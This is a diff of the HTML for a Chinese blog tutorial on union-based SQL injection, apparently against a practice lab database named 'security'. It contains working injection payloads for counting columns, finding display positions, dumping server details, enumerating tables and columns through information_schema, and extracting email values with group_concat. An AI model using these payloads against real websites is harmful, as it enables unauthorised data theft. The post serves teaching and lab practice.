@@ -378,7 +378,7 @@
 </ul>
 <p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(9).png" alt></p>
 <ul>
-<li>然后我们尝试下?id=1’ and 1=1#,然后问题就出来了，#并没有注释掉后面的内容</li>
+<li>然后我们尝试下<code>?id=1&#39; and 1=1#</code>,然后问题就出来了，#并没有注释掉后面的内容</li>
 </ul>
 <p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(6).png" alt></p>
 <ul>
@@ -403,86 +403,53 @@
 <p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(13).png" alt></p>
 <ul>
 <li>在踩了这几个坑后就可以开始正式的操作啦</li>
+</ul>
+<br>
+
+<ul>
 <li>第一步，利用order by判断字段数量</li>
 </ul>
 <pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre>
+<p>&emsp;在<code>order by</code>还是<code>3</code>的时候，页面还是显示正常的</p>
+<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(8).png" alt></p>
+<p>&emsp;到<code>4</code>的时候页面就出错了</p>
+<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(1).png" alt></p>
+<p>&emsp;说明调用的这张表，它只有三个字段</p>
 <ul>
-<li><ul>
-<li>在<code>order by</code>还是<code>3</code>的时候，页面还是显示正常的</li>
-</ul>
-</li>
-<li><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(8).png" alt></p>
-</li>
-<li><ul>
-<li>到<code>4</code>的时候页面就出错了</li>
-</ul>
-</li>
-<li><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(1).png" alt></p>
-</li>
-<li><ul>
-<li>说明调用的这张表，它只有三个字段</li>
-</ul>
-</li>
-<li><p>第二步，利用联合注入判断显示位置，看看哪个字段可以显示在页面上</p>
-</li>
+<li>第二步，利用联合注入判断显示位置，看看哪个字段可以显示在页面上</li>
 </ul>
 <pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment" spellcheck="true">--+</span></code></pre>
+<p>&emsp;结果只有2和3才能显示在页面上</p>
+<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(12).png" alt></p>
 <ul>
-<li><ul>
-<li>结果只有2和3才能显示在页面上</li>
-</ul>
-</li>
-<li><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(12).png" alt></p>
-</li>
-<li><p>第三步，查看数据库信息,将显示位3替换为其他信息的查询</p>
-</li>
+<li>第三步，查看数据库信息,将显示位3替换为其他信息的查询</li>
 </ul>
 <pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,CONCAT_WS('</span><span class="token operator">|</span>'<span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>@<span class="token variable">@datadir</span><span class="token punctuation">,</span>@<span class="token variable">@version_compile_os</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>
 
 这里注意，分割符号两边得加引号</code></pre>
+<p>&emsp;可以看到显示位3上输出了许多信息</p>
+<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(11).png" alt></p>
 <ul>
-<li><ul>
-<li>可以看到显示位3上输出了许多信息</li>
-</ul>
-</li>
-<li><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(11).png" alt></p>
-</li>
-<li><p>第四步，在已知数据库名为security后，列出所有的表名</p>
-</li>
+<li>第四步，在已知数据库名为security后，列出所有的表名</li>
 </ul>
 <pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,table_name from information_schema.tables where table_schema='</span>security' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre>
+<p>&emsp;通过不断变换limit的参数，可以查看不同的表名</p>
+<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard.png" alt></p>
 <ul>
-<li><ul>
-<li>通过不断变换limit的参数，可以查看不同的表名</li>
-</ul>
-</li>
-<li><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard.png" alt></p>
-</li>
-<li><p>第五步，在已知数据库为security且表名为emails的情况下，查看表的字段</p>
-</li>
+<li>第五步，在已知数据库为security且表名为emails的情况下，查看表的字段</li>
 </ul>
 <pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,column_name from information_schema.columns where table_schema='</span>security<span class="token string">' and table_name='</span>emails' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span>
 </code></pre>
+<p>&emsp;同样的，变换limit的参数，可以查看不同的字段</p>
+<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(3).png" alt></p>
 <ul>
-<li><ul>
-<li>同样的，变换limit的参数，可以查看不同的字段</li>
-</ul>
-</li>
-<li><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(3).png" alt></p>
-</li>
-<li><p>第六步，已知字段值的情况下，查看表emails的字段值</p>
-</li>
+<li>第六步，已知字段值的情况下，查看表emails的字段值</li>
 </ul>
 <pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>email_id<span class="token punctuation">)</span> <span class="token keyword">from</span> emails<span class="token comment" spellcheck="true">--+</span></code></pre>
+<p>&emsp;通过group_concat可以列出指定字段的所有值，并且排成一行，默认是逗号分格</p>
+<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(4).png" alt></p>
 <ul>
-<li><ul>
-<li>通过group_concat可以列出指定字段的所有值，并且排成一行，默认是逗号分格</li>
-</ul>
-</li>
-<li><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(4).png" alt></p>
-</li>
-<li><p>总结下</p>
-<ul>
+<li>总结下<ul>
 <li>联合注入的基本步骤为：查找注入点-&gt;查找显示位-&gt;输出数据库信息-&gt;根据数据库名输出表名-&gt;根据数据库名和表名输出字段名-&gt;根据表名和字段名输出字段值</li>
 <li>数据库<code>information_schema</code>中表<code>tables</code>是用来记录所有表名的，而表<code>columns</code>是用来记录所有字段名的</li>
 <li>请求包不会出现<code>#</code>号，只能经过URL编码</li>
